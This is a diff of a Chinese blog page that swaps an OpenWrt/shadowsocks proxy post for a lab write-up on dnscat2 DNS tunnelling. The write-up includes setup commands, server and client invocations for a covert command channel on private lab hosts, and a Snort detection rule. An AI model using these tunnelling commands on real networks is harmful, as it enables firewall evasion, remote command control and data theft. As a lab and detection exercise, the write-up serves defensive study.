@@ -79,7 +79,7 @@
 <link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="openwrt,shadowsocks," />
+  <meta name="keywords" content="dns_tunnel,getshell," />
 
 
 
@@ -95,23 +95,34 @@
 
 
 
-<meta name="description" content="openwrt_ 实现 shadowsocks源码编译 openwrt123456git clone git://git.openwrt.org/15.05/openwrt.git cc./scripts/feeds update #更新最新包./scripts/feeds install -a #安装所有包make defconfig #检查是否齐备make menuconfig #选择配置ma">
+<meta name="description" content="dnscat2 小试环境准备123Server: Kali2.0 192.168.174.140Client: Kali2.0 192.168.174.141DNS server: Windows Server2003 192.168.174.135
+DNS 隧道原理DNS 隧道简单来说就是利用 dns 标准协议包装个人的私有协议，以达到绕过防火墙的作用；
+实验拓扑图本次试验选了开源的 Dnsca">
 <meta property="og:type" content="article">
-<meta property="og:title" content="openwrt 实现 shadowsocks">
-<meta property="og:url" content="http://yoursite.com/2017/08/30/openwrt_shadosocks/index.html">
+<meta property="og:title" content="dnscat2 小试">
+<meta property="og:url" content="http://yoursite.com/2017/08/30/dns隧道之dnscat2/index.html">
 <meta property="og:site_name" content="吾辈岂是蓬蒿人">
-<meta property="og:description" content="openwrt_ 实现 shadowsocks源码编译 openwrt123456git clone git://git.openwrt.org/15.05/openwrt.git cc./scripts/feeds update #更新最新包./scripts/feeds install -a #安装所有包make defconfig #检查是否齐备make menuconfig #选择配置ma">
-<meta property="og:image" content="http://oc1v0t69e.bkt.clouddn.com/%E9%80%89%E5%8C%BA_001.png">
-<meta property="og:image" content="http://oc1v0t69e.bkt.clouddn.com/%E9%80%89%E5%8C%BA_002.png">
-<meta property="og:image" content="http://oc1v0t69e.bkt.clouddn.com/browser_baidu1.png">
-<meta property="og:image" content="http://oc1v0t69e.bkt.clouddn.com/browser_baidu2.png">
-<meta property="og:image" content="http://oc1v0t69e.bkt.clouddn.com/dns.png">
-<meta property="og:image" content="http://oc1v0t69e.bkt.clouddn.com/%E9%80%89%E5%8C%BA_003.png">
-<meta property="og:updated_time" content="2017-08-30T06:50:59.000Z">
+<meta property="og:description" content="dnscat2 小试环境准备123Server: Kali2.0 192.168.174.140Client: Kali2.0 192.168.174.141DNS server: Windows Server2003 192.168.174.135
+DNS 隧道原理DNS 隧道简单来说就是利用 dns 标准协议包装个人的私有协议，以达到绕过防火墙的作用；
+实验拓扑图本次试验选了开源的 Dnsca">
+<meta property="og:image" content="http://i.imgur.com/ZUJGOzm.png">
+<meta property="og:image" content="http://i.imgur.com/kXqejcY.png">
+<meta property="og:image" content="http://i.imgur.com/r7UdkD3.png">
+<meta property="og:image" content="http://i.imgur.com/QOqDzZc.png">
+<meta property="og:image" content="http://i.imgur.com/5EzLELb.png">
+<meta property="og:image" content="http://i.imgur.com/HMsBlYH.png">
+<meta property="og:image" content="http://i.imgur.com/WKPHo4f.png">
+<meta property="og:image" content="http://i.imgur.com/oZ0c1JF.png">
+<meta property="og:image" content="http://i.imgur.com/9w92HtS.png">
+<meta property="og:image" content="http://i.imgur.com/S38bCnl.png">
+<meta property="og:image" content="http://i.imgur.com/29hcFEJ.png">
+<meta property="og:updated_time" content="2017-08-30T07:45:56.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="openwrt 实现 shadowsocks">
-<meta name="twitter:description" content="openwrt_ 实现 shadowsocks源码编译 openwrt123456git clone git://git.openwrt.org/15.05/openwrt.git cc./scripts/feeds update #更新最新包./scripts/feeds install -a #安装所有包make defconfig #检查是否齐备make menuconfig #选择配置ma">
-<meta name="twitter:image" content="http://oc1v0t69e.bkt.clouddn.com/%E9%80%89%E5%8C%BA_001.png">
+<meta name="twitter:title" content="dnscat2 小试">
+<meta name="twitter:description" content="dnscat2 小试环境准备123Server: Kali2.0 192.168.174.140Client: Kali2.0 192.168.174.141DNS server: Windows Server2003 192.168.174.135
+DNS 隧道原理DNS 隧道简单来说就是利用 dns 标准协议包装个人的私有协议，以达到绕过防火墙的作用；
+实验拓扑图本次试验选了开源的 Dnsca">
+<meta name="twitter:image" content="http://i.imgur.com/ZUJGOzm.png">
 
 
 
@@ -141,13 +152,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2017/08/30/openwrt_shadosocks/"/>
+  <link rel="canonical" href="http://yoursite.com/2017/08/30/dns隧道之dnscat2/"/>
 
 
 
 
 
-  <title>openwrt 实现 shadowsocks | 吾辈岂是蓬蒿人</title>
+  <title>dnscat2 小试 | 吾辈岂是蓬蒿人</title>
   
 
 
@@ -294,7 +305,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/08/30/openwrt_shadosocks/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/08/30/dns隧道之dnscat2/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="virusec00">
@@ -311,7 +322,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">openwrt 实现 shadowsocks</h1>
+          <h1 class="post-title" itemprop="name headline">dnscat2 小试</h1>
         
 
         <div class="post-meta">
@@ -323,7 +334,7 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-08-30T14:50:59+08:00">
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-08-30T15:45:56+08:00">
                 2017-08-30
               </time>
             
@@ -346,8 +357,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/安全杂项/" itemprop="url" rel="index">
-                    <span itemprop="name">安全杂项</span>
+                  <a href="/categories/安全工具/" itemprop="url" rel="index">
+                    <span itemprop="name">安全工具</span>
                   </a>
                 </span>
 
@@ -414,52 +425,46 @@
       
 
       
-        <h1 id="openwrt-实现-shadowsocks"><a href="#openwrt-实现-shadowsocks" class="headerlink" title="openwrt_ 实现 shadowsocks"></a>openwrt_ 实现 shadowsocks</h1><h2 id="源码编译-openwrt"><a href="#源码编译-openwrt" class="headerlink" title="源码编译 openwrt"></a>源码编译 openwrt</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">git clone git://git.openwrt.org/15.05/openwrt.git cc</div><div class="line">./scripts/feeds update #更新最新包</div><div class="line">./scripts/feeds install -a #安装所有包</div><div class="line">make defconfig #检查是否齐备</div><div class="line">make menuconfig #选择配置</div><div class="line">make -j3 #三线程编译</div></pre></td></tr></table></figure>
-<p>这里成的固件包括各种设备上的需要的原始文件，或者物理硬件路由上的或者光盘镜像 ISO 都有，你所选择生成的 Target Image<br><a id="more"></a></p>
-<h2 id="GL-AR-300-刷-openwrt-系统"><a href="#GL-AR-300-刷-openwrt-系统" class="headerlink" title="GL-AR-300 刷 openwrt 系统"></a>GL-AR-300 刷 openwrt 系统</h2><ol>
-<li>选择固件，这里我选择的是 <code>wget http://downloads.openwrt.org/snapshots/trunk/ar71xx/generic/openwrt-ar71xx-generic-gl-inet-6416A-v1-squashfs-factory.bin</code></li>
-<li><p>网线连接 Lan 口，设置你的物理主机的静态 IP 为192.168.1.0/24中某一个，别 1.1,我自己的设置如下,一定注意是临时地址</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ifconfig eth1 192.168.1.10 netmask 255.255.255.0</div><div class="line">route add default gw 192.168.1.1</div></pre></td></tr></table></figure>
-</li>
-<li><p>长按路由上的 reset 键，插入电源，可以看到指示灯闪烁，等到稳定不闪时即可，松开 reset</p>
-</li>
-<li>访问 192.168.1.1，即可看到刷机界面，上传的你的固件即可自动刷机，期间如果有问题，建议多刷几遍<h2 id="OpenWrt-虚拟机制作"><a href="#OpenWrt-虚拟机制作" class="headerlink" title="OpenWrt 虚拟机制作"></a>OpenWrt 虚拟机制作</h2></li>
-<li>安装qemu<br><code>sudo apt-get install  qemu-kvm</code></li>
-<li>下载 OpenWrt img<br><code>wget https://downloads.openwrt.org/chaos_calmer/15.05/x86/generic/openwrt-15.05-x86-generic-combined-squashfs.img</code></li>
-<li>制作 VMDK<br><code>sudo qemu-img convert -f raw openwrt-15.05-x86-generic-combined-squashfs.img  -O vmdk openwrt-15.05-x86-generic-combined.vmdk</code></li>
-<li>新建虚拟机，并修改vms文件，参考<a href="http://blog.csdn.net/xingyuzhe/article/details/51280337" target="_blank" rel="external">这里</a></li>
+        <h1 id="dnscat2-小试"><a href="#dnscat2-小试" class="headerlink" title="dnscat2 小试"></a>dnscat2 小试</h1><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Server: Kali2.0 192.168.174.140</div><div class="line">Client: Kali2.0 192.168.174.141</div><div class="line">DNS server: Windows Server2003 192.168.174.135</div></pre></td></tr></table></figure>
+<h2 id="DNS-隧道原理"><a href="#DNS-隧道原理" class="headerlink" title="DNS 隧道原理"></a>DNS 隧道原理</h2><p>DNS 隧道简单来说就是利用 dns 标准协议包装个人的私有协议，以达到绕过防火墙的作用；</p>
+<h2 id="实验拓扑图"><a href="#实验拓扑图" class="headerlink" title="实验拓扑图"></a>实验拓扑图</h2><p>本次试验选了开源的 Dnscat2 工具，可以通过<a href="https://github.com/iagox86/dnscat2" target="_blank" rel="external">这里</a>下载它，工具的拓扑图如下；</p>
+<p><img src="http://i.imgur.com/ZUJGOzm.png" alt=""></p>
+<h2 id="安装-dnscat2"><a href="#安装-dnscat2" class="headerlink" title="安装 dnscat2"></a>安装 dnscat2</h2><p>Server：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/iagox86/dnscat2.git </div><div class="line">cd dnscat2/server</div><div class="line">bundle install</div></pre></td></tr></table></figure></p>
+<p>Client：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cd dnscat2/client</div><div class="line">make</div></pre></td></tr></table></figure></p>
+<h2 id="搭建-dnsserver"><a href="#搭建-dnsserver" class="headerlink" title="搭建 dnsserver"></a>搭建 dnsserver</h2><ul>
+<li>这里选择的是winserver2003</li>
+</ul>
+<ol>
+<li>添加 windows （DNS）组件;</li>
 </ol>
-<h2 id="安装-shadowsocks"><a href="#安装-shadowsocks" class="headerlink" title="安装 shadowsocks"></a>安装 shadowsocks</h2><p>C 语言版本的 shadowsocks 能够转发 UDP 协议，这里着重展示 ss-local 的socks5代理以及 ss-redir（透明代理） 的全局代理，目前大部分用 ss 的，基本都是 socks5 代理，而 ss-redir，需要配合 iptables 的 NAT 功能实现全局代理，具体安装参考[Github]（<a href="https://github.com/shadowsocks/shadowsocks-libev）" target="_blank" rel="external">https://github.com/shadowsocks/shadowsocks-libev）</a></p>
-<h2 id="防火墙配置"><a href="#防火墙配置" class="headerlink" title="防火墙配置"></a>防火墙配置</h2><ol>
-<li><p>设备清单</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">vps centos6.5</div><div class="line">smart router	openwrt</div><div class="line">pc	windows10</div></pre></td></tr></table></figure>
-</li>
-<li><p>iptables 配置</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">iptables -t nat -N shadowsocks //创建新链</div><div class="line">iptables -t nat -A shadowsocks -d 45.78.11.185 -j RETURN //防止死循环</div><div class="line">iptables -t nat -A shadowsocks -p tcp -j REDIRECT --to-ports 1080 //流量转发到1080端口</div><div class="line">#iptables -t nat -A OUTPUT -p tcp -j shadowsocks</div><div class="line">#iptables -t nat -A FORWARD -p tcp -j shadowsocks</div><div class="line">iptables -t nat -I PREROUTING -p tcp -j shadowsocks //生效</div></pre></td></tr></table></figure>
-</li>
+<p><img src="http://i.imgur.com/kXqejcY.png" alt=""></p>
+<ol>
+<li>首先把本机的TCP/IP属性改好，DNS 的 IP 要填上本机的IP，本机IP一定是固定 IP;</li>
 </ol>
-<h2 id="Questions"><a href="#Questions" class="headerlink" title="Questions"></a>Questions</h2><ol>
-<li>ss-local 翻墙成功，ss-redir翻墙失败。<br>初步猜测：<ol>
-<li>iptables转发问题、</li>
-<li>socks5 和透明代理穿 GFW 特征问题</li>
-<li>其他问题；</li>
+<p><img src="http://i.imgur.com/r7UdkD3.png" alt=""></p>
+<ol>
+<li>打开 dns 配置，添加正向解析区域，这里我设置是 dnscat，并且新建委派 test，将地址指向了 dnscat2 服务端，具体不懂可参考这篇<a href="http://www.jb51.net/article/31605.htm" target="_blank" rel="external">博文</a>;</li>
 </ol>
-</li>
+<p><img src="http://i.imgur.com/QOqDzZc.png" alt=""></p>
+<h2 id="开始实验"><a href="#开始实验" class="headerlink" title="开始实验"></a>开始实验</h2><ol>
+<li>配置 dnscat2 客户端 dns，编辑 <code>vim /etc/resolv.conf</code>，改变 dns 服务器地址指向我们的 dns 服务器;</li>
 </ol>
-<p>对 ss-local 本地抓包和 VPS 抓包均表示正常，访问外网正常，对 ss-redir 进行测试，发现本机IP，已然是国外主机，访问 google、facebook 失败，可以访问 pornhub 哦……</p>
-<p><img src="http://oc1v0t69e.bkt.clouddn.com/%E9%80%89%E5%8C%BA_001.png" alt="one" title="ip"></p>
-<p><img src="http://oc1v0t69e.bkt.clouddn.com/%E9%80%89%E5%8C%BA_002.png" alt="two" title="ip"></p>
-<p>iptables 转发问题应该排除，目前机器确实是在外网，但是访问不了 Google 等网站，很大可能与 GFW 有关，首先想到的是穿墙数据包的特征问题，我们抓取 ss-local 情况下的访问百度、163、Google 网站数据包，每个抓两次，再次抓取 ss-redir 情况下的访问百度、163、Google 网站数据包，每个抓两次，对比分析，单向对ss-local，ss-redir 的连接 VPS 的数据包分析，无明显的规则特征，而且传输数据多变，后来查询相关资料，发现 AES-256-CFB 的加密手法中 CFB 每次都会随机生成一个随机向量参与加密，如下图展现 ss-redir 两次访问百度所传输到 vps 的数据请求：</p>
-<p>第一次访问百度：</p>
-<p><img src="http://oc1v0t69e.bkt.clouddn.com/browser_baidu1.png" alt="five" title="browser_bd"></p>
-<p>第二次访问百度：</p>
-<p><img src="http://oc1v0t69e.bkt.clouddn.com/browser_baidu2.png" alt="six" title="browser_bd"></p>
-<p>两次访问百度的密文都不一样，这样一来，GFW 也无法识别，故排除第二种情况</p>
-<p>对当前路由和 vps 开启 -v 参数，观察日志，并且对 vps 公网网卡进行抓包，发现最新版的 ss-redir 支持的 udp 转发对 DNS 协议不友好，如下图：</p>
-<p><img src="http://oc1v0t69e.bkt.clouddn.com/dns.png" alt="three" title="dns"></p>
-<p>数据到了 VPS 只是在 VPS 上处理上出现了问题，那就证明 iptables 策略没什么问题，接下里就是关于 DNS 的相关问题了，以前记得 GFW 有着 DNS 投毒工具，莫不是如此，发现在抓发日志上，每次访问 Google 时总是指向某个 IP，而这个IP根本不是谷歌的，如下图：</p>
-<p><img src="http://oc1v0t69e.bkt.clouddn.com/%E9%80%89%E5%8C%BA_003.png" alt="four" title="ip_dir"></p>
-<p>于是谷歌之，发现有很大的收获，在这篇<a href="https://xijie.wordpress.com/2010/01/07/gfw-dns-%E6%B1%A1%E6%9F%93-ip-%E5%88%97%E8%A1%A8/" target="_blank" rel="external">文章</a> 中详尽的介绍了 GFW 干的”坏事”，GFW 对 UDP流量，也是 DNS 进行了很多欺骗，导致如果你在全局代理上如果处理不好，DNS 请求的相关流量，我这里由于 vps 没有处理好，导致本地 dns 访问 google，产生了错误的 IP，以至于一直在坑里，同样访问 facebook 也是中毒……</p>
+<p><img src="http://i.imgur.com/5EzLELb.png" alt=""></p>
+<ol>
+<li>Dnscat2 Server 执行 <code>ruby dnscat2.rb test.dnscat.com</code>;</li>
+</ol>
+<p><img src="http://i.imgur.com/HMsBlYH.png" alt=""></p>
+<ol>
+<li>Dnscat2 Client 执行<code>./dnscat --secret=0f006deae17177b9579005a69c7f7af1 test.dnscat.com</code>;</li>
+</ol>
+<p><img src="http://i.imgur.com/WKPHo4f.png" alt=""></p>
+<ol>
+<li>具体的操作，自己看 github;</li>
+</ol>
+<p><img src="http://i.imgur.com/oZ0c1JF.png" alt=""><br><img src="http://i.imgur.com/9w92HtS.png" alt=""></p>
+<h2 id="抓包分析"><a href="#抓包分析" class="headerlink" title="抓包分析"></a>抓包分析</h2><p><img src="http://i.imgur.com/S38bCnl.png" alt=""><br>流量上看到的全是 dns 协议，这样以来普通的防火墙根本不会拦截这种”正常”的 dns 协议包，而黑客正是通过这样的隧道可以完成命令传输，数据偷取等相关操作;</p>
+<h2 id="Snort-规则编写"><a href="#Snort-规则编写" class="headerlink" title="Snort 规则编写"></a>Snort 规则编写</h2><p>观察 dns 隧道的特征，数据基本都在 QNAME 字段进行传输，且采用了加密算法，查阅相关资料，显示出来的加密后的域名数字过多，正常的单个域名是不可能数字达到30或者40这么多，这个可以通过全球的域名排名计算域名的相关性，snort规则如下;<br><img src="http://i.imgur.com/29hcFEJ.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">alert udp $HOME_NET any -&gt; $EXTERNAL_NET 53 (msg:&quot;Abnormal Dns Tunneling Attempt &quot;; flow:to_server; content:&quot;|01 00|&quot;; offset:2; depth:2;  pcre:&quot;/(\d.*?)&#123;35,&#125;/&quot;; sid:20168888; rev:1;)</div></pre></td></tr></table></figure>
 
       
     </div>
@@ -477,9 +482,9 @@
       
         <div class="post-tags">
           
-            <a href="/tags/openwrt/" rel="tag"># openwrt</a>
+            <a href="/tags/dns-tunnel/" rel="tag"># dns_tunnel</a>
           
-            <a href="/tags/shadowsocks/" rel="tag"># shadowsocks</a>
+            <a href="/tags/getshell/" rel="tag"># getshell</a>
           
         </div>
       
@@ -492,8 +497,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/08/30/本地apt源和pip源搭建/" rel="next" title="私有化 apt 和 pip">
-                <i class="fa fa-chevron-left"></i> 私有化 apt 和 pip
+              <a href="/2017/08/30/openwrt_shadosocks/" rel="next" title="openwrt 实现 shadowsocks">
+                <i class="fa fa-chevron-left"></i> openwrt 实现 shadowsocks
               </a>
             
           </div>
@@ -501,10 +506,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2017/08/30/dns隧道之dnscat2/" rel="prev" title="dnscat2 小试">
-                dnscat2 小试 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -666,7 +667,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#openwrt-实现-shadowsocks"><span class="nav-number">1.</span> <span class="nav-text">openwrt_ 实现 shadowsocks</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#源码编译-openwrt"><span class="nav-number">1.1.</span> <span class="nav-text">源码编译 openwrt</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GL-AR-300-刷-openwrt-系统"><span class="nav-number">1.2.</span> <span class="nav-text">GL-AR-300 刷 openwrt 系统</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#OpenWrt-虚拟机制作"><span class="nav-number">1.3.</span> <span class="nav-text">OpenWrt 虚拟机制作</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#安装-shadowsocks"><span class="nav-number">1.4.</span> <span class="nav-text">安装 shadowsocks</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#防火墙配置"><span class="nav-number">1.5.</span> <span class="nav-text">防火墙配置</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Questions"><span class="nav-number">1.6.</span> <span class="nav-text">Questions</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#dnscat2-小试"><span class="nav-number">1.</span> <span class="nav-text">dnscat2 小试</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#环境准备"><span class="nav-number">1.1.</span> <span class="nav-text">环境准备</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DNS-隧道原理"><span class="nav-number">1.2.</span> <span class="nav-text">DNS 隧道原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#实验拓扑图"><span class="nav-number">1.3.</span> <span class="nav-text">实验拓扑图</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#安装-dnscat2"><span class="nav-number">1.4.</span> <span class="nav-text">安装 dnscat2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#搭建-dnsserver"><span class="nav-number">1.5.</span> <span class="nav-text">搭建 dnsserver</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#开始实验"><span class="nav-number">1.6.</span> <span class="nav-text">开始实验</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#抓包分析"><span class="nav-number">1.7.</span> <span class="nav-text">抓包分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Snort-规则编写"><span class="nav-number">1.8.</span> <span class="nav-text">Snort 规则编写</span></a></li></ol></li></ol></div>
             
 
           </div>
